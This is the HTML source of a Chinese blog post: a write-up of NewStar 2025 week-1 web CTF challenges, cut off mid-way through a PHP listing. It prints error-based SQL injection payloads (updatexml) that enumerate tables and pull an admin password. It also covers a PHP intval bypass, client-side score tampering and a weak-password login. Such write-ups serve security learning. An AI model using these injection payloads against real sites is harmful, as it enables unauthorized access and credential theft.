@@ -1,0 +1,1310 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" week1 multi-headach3 根据提示先访问robots.txt,得/hidden.php，然后抓包发包flag在响应头\nstrange_login 考点:报错注入 简单测试发现是sql单引号闭合，而且有报错，直接打sql 报错注入就行\n">
+<title>2025-newstar</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/2025-newstar/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-newstar">
+<meta property='og:description' content=" week1 multi-headach3 根据提示先访问robots.txt,得/hidden.php，然后抓包发包flag在响应头\nstrange_login 考点:报错注入 简单测试发现是sql单引号闭合，而且有报错，直接打sql 报错注入就行\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/2025-newstar/'>
+<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-10-03T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-03T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="2025-newstar">
+<meta name="twitter:description" content=" week1 multi-headach3 根据提示先访问robots.txt,得/hidden.php，然后抓包发包flag在响应头\nstrange_login 考点:报错注入 简单测试发现是sql单引号闭合，而且有报错，直接打sql 报错注入就行\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#multi-headach3">multi-headach3</a></li>
+    <li><a href="#strange_login">strange_login</a>
+      <ol>
+        <li><a href="#考点报错注入">考点:报错注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#黑客小w的故事1">黑客小W的故事（1）</a></li>
+    <li><a href="#宇宙的中心是php">宇宙的中心是php</a>
+      <ol>
+        <li><a href="#考点intval性质">考点:intval性质</a></li>
+      </ol>
+    </li>
+    <li><a href="#别笑你也过不了第二关">别笑，你也过不了第二关</a></li>
+    <li><a href="#我真得控制你了">我真得控制你了</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#dd加速器">DD加速器</a></li>
+    <li><a href="#白帽小k的故事1">白帽小K的故事（1）</a></li>
+    <li><a href="#搞点哦润吉吃吃橘">搞点哦润吉吃吃橘</a></li>
+    <li><a href="#真的是签到诶">真的是签到诶</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
+                web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025-newstar/">2025-newstar</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-10-03</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="week1">week1
+</h1><h2 id="multi-headach3">multi-headach3
+</h2><p>根据提示先访问robots.txt,得/hidden.php，然后抓包发包flag在响应头</p>
+<p><img src="/p/2025-newstar/image-20251003095906858.png"
+	width="1208"
+	height="414"
+	srcset="/p/2025-newstar/image-20251003095906858_hu_9fc0131cc2fb3d17.png 480w, /p/2025-newstar/image-20251003095906858_hu_36c98920523e94c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003095906858"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="700px"
+	
+></p>
+<h2 id="strange_login">strange_login
+</h2><h3 id="考点报错注入">考点:报错注入
+</h3><p>简单测试发现是sql单引号闭合，而且有报错，直接打sql 报错注入就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;/**/or/**/updatexml(1,concat(&#39;~&#39;,(select/**/database())),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251003102551946.png" alt="image-20251003102551946" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;/**/or/**/updatexml(1,concat(&#39;~&#39;,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251003102629802.png" alt="image-20251003102629802" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;/**/or/**/updatexml(1,concat(&#39;~&#39;,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#34;users&#34;)),1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251003102706312.png" alt="image-20251003102706312" style="zoom:50%;" />
+<p>然后分别查一下字段没有flag，那根据题目提示说admin登入，显然是要得密码然后登入拿flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;/**/or/**/updatexml(1,concat(&#39;</span><span class="o">~</span><span class="s1">&#39;,(select/**/group_concat(password)/**/from/**/`users`)),1)#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到<code>a7f8d9e2b3c4f5a6b7c8d9e0f1a2b3c</code>,但是不对？？可能是密码太长？没显示全？（显示的字符补全，那我们就分别查询，先查1-10，再查11-20，以此直到查到flag）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;/**/or/**/updatexml(1,concat(&#39;</span><span class="o">~</span><span class="s1">&#39;,mid((select/**/group_concat(password)/**/from/**/`users`),1,10)),1)#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>查了三段<code>a7f8d9e2b3,c4f5a6b7c8d9e0f1a2b3,d9e0f1a2b3c4</code>显然第三段有点重复，所以拼接得到的密码是<code>a7f8d9e2b3c4f5a6b7c8d9e0f1a2b3c4</code>(直接查password就少一个4，绷不住)，然后登入就有flag</p>
+<h2 id="黑客小w的故事1">黑客小W的故事（1）
+</h2><p>根据提示抓包。count=1时每次发包多16，count=2时多32,那就直接让count=100，发一次包直接过</p>
+<p><img src="/p/2025-newstar/image-20251003112904304.png"
+	width="1271"
+	height="406"
+	srcset="/p/2025-newstar/image-20251003112904304_hu_cfe8777218544ef7.png 480w, /p/2025-newstar/image-20251003112904304_hu_ff6e6de9f659b579.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003112904304"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="313"
+		data-flex-basis="751px"
+	
+></p>
+<p>替换token到下一关，这一关，进去提示shipin=mogubaozi，还有post传参，参数随便试试，值就是第二关开始对话的那个guding，得到要用delete方法</p>
+<p><img src="/p/2025-newstar/image-20251003115153909.png"
+	width="1528"
+	height="461"
+	srcset="/p/2025-newstar/image-20251003115153909_hu_1bee97bf4b09afa0.png 480w, /p/2025-newstar/image-20251003115153909_hu_9b698559501b7c26.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003115153909"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="331"
+		data-flex-basis="795px"
+	
+></p>
+<h2 id="宇宙的中心是php">宇宙的中心是php
+</h2><h3 id="考点intval性质">考点:intval性质
+</h3><p>查看你源码得s3kret.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;newstar2025&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$answer</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;newstar2025&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$answer</span><span class="p">)</span><span class="o">!=</span><span class="mi">47</span><span class="o">&amp;&amp;</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$answer</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="mi">47</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;你还未参透奥秘&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这就是十进制!=47，自动取整=47，显然利用intval性质，直接赋值0x2f 或 057就行</p>
+<img src="image-20251003211027519.png" alt="image-20251003211027519" style="zoom:50%;" />
+<p>输入是字符，这时候intval默认是10进制</p>
+<p><a class="link" href="[://www.runoob.com/php/php-intval-function.html" >PHP intval() 函数 | 菜鸟教程</a></p>
+<h2 id="别笑你也过不了第二关">别笑，你也过不了第二关
+</h2><p>审计js代码，其实就算改分数</p>
+<p><img src="/p/2025-newstar/image-20251003211901238.png"
+	width="1051"
+	height="241"
+	srcset="/p/2025-newstar/image-20251003211901238_hu_ec16abfc8990a60a.png 480w, /p/2025-newstar/image-20251003211901238_hu_7cb5d4b86cfcf77.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003211901238"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="436"
+		data-flex-basis="1046px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">score = 1000000; // 直接设置分数
+</span></span><span class="line"><span class="cl">scoreEl.innerText = &#34;分数: &#34; + score;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后分数够了访问flag.php,然后post传参</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">score=1000000 (具体数值取决于通关时的分数)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-newstar/image-20251003212024144.png"
+	width="566"
+	height="177"
+	srcset="/p/2025-newstar/image-20251003212024144_hu_658c3915df6a7762.png 480w, /p/2025-newstar/image-20251003212024144_hu_13894240ee67ac88.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003212024144"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="319"
+		data-flex-basis="767px"
+	
+></p>
+<p><img src="/p/2025-newstar/image-20251003211828579.png"
+	width="1790"
+	height="287"
+	srcset="/p/2025-newstar/image-20251003211828579_hu_df08a45a2d3a0cf5.png 480w, /p/2025-newstar/image-20251003211828579_hu_d3158d4b2d49f4f.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251003211828579"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="623"
+		data-flex-basis="1496px"
+	
+></p>
+<h2 id="我真得控制你了">我真得控制你了
+</h2><p>审计js代码，想按按钮没成功，那就直接伪造发包</p>
+<img src="image-20251003214411239.png" alt="image-20251003214411239" style="zoom:50%;" />
+<p>然后一关弱口令admin/111111绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generate_dynamic_flag</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;ICQ_FLAG&#34;</span><span class="p">)</span> <span class="o">?:</span> <span class="s1">&#39;default_flag&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;newstar&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;newstar&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;恭喜掌握新姿势&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[^\d*\/~()\s]/&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;老套路了，行不行啊&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[\d\s]+$/&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">))</span> <span class="p">{</span>
